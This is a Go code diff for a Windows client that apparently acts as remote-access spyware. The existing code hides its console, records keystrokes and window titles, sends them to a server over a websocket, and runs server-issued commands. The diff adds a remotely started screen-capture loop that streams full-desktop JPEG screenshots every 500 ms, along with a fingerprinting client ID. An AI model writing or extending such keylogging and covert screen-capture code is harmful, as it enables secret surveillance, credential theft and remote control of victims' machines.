@@ -1,7 +1,14 @@
 package main
 
 import (
+	"bytes"
+	"crypto/md5"
+	"encoding/base64"
+	"encoding/hex"
 	"fmt"
+	"image"
+	"image/color"
+	"image/jpeg"
 	"log"
 	"net/url"
 	"os"
@@ -37,17 +44,30 @@ type ActivityData struct {
 var (
 	user32   = syscall.NewLazyDLL("user32.dll")
 	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	gdi32    = syscall.NewLazyDLL("gdi32.dll")
 
-	getWindowText       = user32.NewProc("GetWindowTextW")
-	getWindowTextLength = user32.NewProc("GetWindowTextLengthW")
-	getForegroundWindow = user32.NewProc("GetForegroundWindow")
-	messageBox          = user32.NewProc("MessageBoxW")
-	getAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
-	getConsoleWindow    = kernel32.NewProc("GetConsoleWindow")
-	showWindow          = user32.NewProc("ShowWindow")
+	getWindowText          = user32.NewProc("GetWindowTextW")
+	getWindowTextLength    = user32.NewProc("GetWindowTextLengthW")
+	getForegroundWindow    = user32.NewProc("GetForegroundWindow")
+	messageBox             = user32.NewProc("MessageBoxW")
+	getAsyncKeyState       = user32.NewProc("GetAsyncKeyState")
+	getConsoleWindow       = kernel32.NewProc("GetConsoleWindow")
+	showWindow             = user32.NewProc("ShowWindow")
+	getDC                  = user32.NewProc("GetDC")
+	releaseDC              = user32.NewProc("ReleaseDC")
+	getSystemMetrics       = user32.NewProc("GetSystemMetrics")
+	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
+	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
+	selectObject           = gdi32.NewProc("SelectObject")
+	bitBlt                 = gdi32.NewProc("BitBlt")
+	deleteDC               = gdi32.NewProc("DeleteDC")
+	deleteObject           = gdi32.NewProc("DeleteObject")
+	getDIBits              = gdi32.NewProc("GetDIBits")
 
-	conn      *websocket.Conn
-	isLogging bool = true
+	conn          *websocket.Conn
+	clientID      string
+	isLogging     bool = true
+	screenSharing bool = false
 )
 
 func main() {
@@ -117,13 +137,16 @@ func connectToServer() {
 		return
 	}
 
-	// Register with server
+	// Generate unique client ID based on hostname and MAC address
 	hostname, _ := os.Hostname()
+	clientID = generateClientID(hostname)
+
 	regMsg := Message{
 		Type: "register",
 		Data: map[string]interface{}{
 			"hostname": hostname,
 			"os":       runtime.GOOS,
+			"clientId": clientID,
 		},
 		Time: time.Now(),
 	}
@@ -157,8 +180,21 @@ func handleServerMessages() {
 			isLogging = false
 		case "run_command":
 			runCommand(msg.Data.(string))
+		case "start_screen_share":
+			screenSharing = true
+			go startScreenCapture()
+		case "stop_screen_share":
+			screenSharing = false
 		}
 	}
+}
+
+func generateClientID(hostname string) string {
+	// Create a unique ID based on hostname and executable path
+	exe, _ := os.Executable()
+	data := hostname + exe + runtime.GOOS
+	hash := md5.Sum([]byte(data))
+	return hex.EncodeToString(hash[:])
 }
 
 func showPopupMessage(message string) {
@@ -314,4 +350,131 @@ func sendActivityLog(activityType, window, keystroke string) {
 	}
 
 	conn.WriteJSON(msg)
+}
+
+func startScreenCapture() {
+	for screenSharing {
+		if conn == nil {
+			time.Sleep(1 * time.Second)
+			continue
+		}
+
+		screenshot := captureScreen()
+		if screenshot != "" {
+			msg := Message{
+				Type: "screen_capture",
+				Data: map[string]interface{}{
+					"clientId": clientID,
+					"image":    screenshot,
+				},
+				Time: time.Now(),
+			}
+			conn.WriteJSON(msg)
+		}
+
+		time.Sleep(500 * time.Millisecond) // Capture every 500ms
+	}
+}
+
+func captureScreen() string {
+	if runtime.GOOS != "windows" {
+		return ""
+	}
+
+	// Get screen dimensions
+	width, _, _ := getSystemMetrics.Call(0)  // SM_CXSCREEN
+	height, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN
+
+	// Get desktop DC
+	hdc, _, _ := getDC.Call(0)
+	if hdc == 0 {
+		return ""
+	}
+	defer releaseDC.Call(0, hdc)
+
+	// Create compatible DC
+	memDC, _, _ := createCompatibleDC.Call(hdc)
+	if memDC == 0 {
+		return ""
+	}
+	defer deleteDC.Call(memDC)
+
+	// Create compatible bitmap
+	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, width, height)
+	if hBitmap == 0 {
+		return ""
+	}
+	defer deleteObject.Call(hBitmap)
+
+	// Select bitmap into memory DC
+	selectObject.Call(memDC, hBitmap)
+
+	// Copy screen to memory DC
+	bitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, 0x00CC0020) // SRCCOPY
+
+	// Create BITMAPINFO structure
+	bi := createBitmapInfo(int(width), int(height))
+
+	// Calculate image size
+	imageSize := int(width) * int(height) * 3 // 24-bit RGB
+	imageData := make([]byte, imageSize)
+
+	// Get bitmap bits
+	getDIBits.Call(hdc, hBitmap, 0, height,
+		uintptr(unsafe.Pointer(&imageData[0])),
+		uintptr(unsafe.Pointer(&bi[0])), 0)
+
+	// Convert to JPEG and encode to base64
+	img := createImageFromBits(imageData, int(width), int(height))
+	if img == nil {
+		return ""
+	}
+
+	var buf bytes.Buffer
+	err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 50})
+	if err != nil {
+		return ""
+	}
+
+	return base64.StdEncoding.EncodeToString(buf.Bytes())
+}
+
+func createBitmapInfo(width, height int) []byte {
+	// BITMAPINFOHEADER structure (40 bytes)
+	bi := make([]byte, 40)
+
+	// biSize
+	*(*uint32)(unsafe.Pointer(&bi[0])) = 40
+	// biWidth
+	*(*int32)(unsafe.Pointer(&bi[4])) = int32(width)
+	// biHeight (negative for top-down)
+	*(*int32)(unsafe.Pointer(&bi[8])) = -int32(height)
+	// biPlanes
+	*(*uint16)(unsafe.Pointer(&bi[12])) = 1
+	// biBitCount
+	*(*uint16)(unsafe.Pointer(&bi[14])) = 24
+	// biCompression
+	*(*uint32)(unsafe.Pointer(&bi[16])) = 0 // BI_RGB
+
+	return bi
+}
+
+func createImageFromBits(data []byte, width, height int) image.Image {
+	img := image.NewRGBA(image.Rect(0, 0, width, height))
+
+	for y := 0; y < height; y++ {
+		for x := 0; x < width; x++ {
+			offset := (y*width + x) * 3
+			if offset+2 < len(data) {
+				// BGR to RGBA
+				b := data[offset]
+				g := data[offset+1]
+				r := data[offset+2]
+
+				img.Set(x, y, color.RGBA{r, g, b, 255})
+			}
+		}
+	}
+
+	return img
 }
